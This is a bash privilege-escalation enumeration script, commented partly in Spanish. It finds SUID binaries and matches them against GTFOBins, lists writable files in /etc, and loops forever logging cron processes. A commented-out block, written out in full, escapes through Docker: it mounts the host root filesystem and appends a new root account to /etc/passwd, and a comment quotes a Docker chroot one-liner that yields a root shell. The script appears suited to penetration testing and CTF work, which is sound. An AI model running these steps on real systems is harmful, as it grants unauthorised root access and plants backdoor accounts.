#!/bin/bash

SUID="ab agetty alpine ar aria2c arj arp as ascii-xfr ash aspell atobm awk awk base32 base64 basenc basez bash bridge busybox byebug bzip2 capsh cat chmod choom chown chroot cmp column comm composer cp cpio cpulimit csh csplit csvtool cupsfilter curl cut dash date dd dialog diff dig dmsetup docker dosbox dvips ed ed efax emacs env eqn expand expect file find fish flock fmt fold gawk gawk gcore gdb genie genisoimage gimp ginsh git grep gtester gzip hd head hexdump highlight hping3 iconv iftop install ionice ip ispell jjs join jq jrunscript ksh ksshell kubectl latex ld.so ldconfig less lftp logsave look lua lua lualatex luatex make mawk mawk more mosquitto msgattrib msgcat msgconv msgfilter msgmerge msguniq multitime mv mysql nano nasm nawk nawk nc nft nice nl nm nmap nmap node nohup octave od openssl openvpn paste pdflatex pdftex perf perl pg php pic pico pidstat pr pry psftp ptx python rake readelf restic rev rlwrap rpm rpmdb rpmquery rpmverify rsync run-parts rview rview rvim rvim sash scanmem scp scrot sed setarch setfacl shuf slsh socat soelim sort sqlite3 sqlite3 ss ssh-keygen ssh-keyscan sshpass start-stop-daemon stdbuf strace strings sysctl systemctl tac tail tar taskset tasksh tbl tclsh tee telnet tex tftp tic time timeout tmate troff ul unexpand uniq unshare unzip update-alternatives uudecode uuencode view view vigr vim vim vimdiff vimdiff vipw watch watch wc wget whiptail xargs xdotool xelatex xetex xmodmap xmore xxd xz yash zip zsh zsoelim "

#Colours
greenColour="\\e[0;32m\\033[1m"
endColour="\\033[0m\\e[0m"
redColour="\\e[0;31m\\033[1m"
blueColour="\\e[0;34m\\033[1m"
yellowColour="\\e[0;33m\\033[1m"
purpleColour="\\e[0;35m\\033[1m"
turquoiseColour="\\e[0;36m\\033[1m"
grayColour="\\e[0;37m\\033[1m"

# trap ctrl-c and call ctrl_c()
trap ctrl_c INT
function ctrl_c(){
    echo -e "\\n${yellowColour}[*]${endColour}${grayColour} Saliendo de manera controlada ${endColour}\\n"
    exit 0
}
# Si tienes la contraseña
# sudo -l

# SUID
find / -perm -4000 2>/dev/null | tee List-suid-$(echo $USER).txt
# If there is internet download suid, if not use local
SUID_INTERNET=`curl -k -s -X GET https://gtfobins.github.io/\#+suid`
if [ $? -eq 0 ]; then
    echo "Online"
    SUID=`echo "$SUID_INTERNET" | grep -i '/gtfobins/' | grep -i "SUID" | awk '{print $3}' FS="/"`
else
    echo "Offline"
fi
echo "$SUID" > /tmp/vulnerable-suid.txt

for SUID in $(cat List-suid-$(echo $USER).txt | awk 'NF{print $NF}' FS="/")
do
	vuln_suid=$(grep -i "^$SUID$" /tmp/vulnerable-suid.txt)
	if [ $? -eq 0 ]; then
		echo -e "${greenColour}\\n[SUID] Binary $vuln_suid is vulnerable ${endColour}" | tee List-vulnerable-suid-found.txt
	fi
done
rm -rf /tmp/vulnerable-suid.txt

# Etc path Writable
writable=$(find /etc -writable 2>/dev/null)
echo -e "${greenColour}\\n[Writable] $writable ${endColour}\\n" | tee List-etc-writables.txt

# Docker, necesita internet ojo, revisar también la de root directo: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
#if ! [ -x "$(command -v docker)" ]; then
#    docker_test=$( docker ps | grep "CONTAINER ID" | cut -d " " -f 1-2 ) 
#
#    if [ $(id -u) -eq 0 ]; then
#        echo "The user islready root. Have fun ;-)"
#        exit
#        
#    elif [ "$docker_test" == "CONTAINER ID" ]; then
#        echo 'Please write down your new root credentials.'
#        read -p 'Choose a root user name: ' rootname
#        read -s -p 'Choose a root password: ' passw
#        hpass=$(openssl passwd -1 -salt mysalt $passw)
#
#        echo -e "$rootname:$hpass:0:0:root:/root:/bin/bash" > new_account
#        mv new_account /tmp/new_account
#        docker run -tid -v /:/mnt/ --name flast101.github.io alpine # CHANGE THIS IF NEEDED
#        docker exec -ti flast101.github.io sh -c "cat /mnt/tmp/new_account >> /mnt/etc/passwd"
#        sleep 1; echo '...'
#        
#        echo 'Success! Root user ready. Enter your password to login as root:'
#        docker rm -f flast101.github.io
#        docker image rm alpine
#        rm /tmp/new_account
#        su $rootname
#
#    else echo "Your account does not have permission to execute docker or docker is not running, aborting..."
#        exit
#    fi
#fi

# Process monitoring for search cron
old_process=$(ps -eo user,command)
while true; do
	new_process=$(ps -eo user,command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\\>]" | grep -A 10 -i "cron" | tee -a List-cron.txt
	old_process=$new_process
done
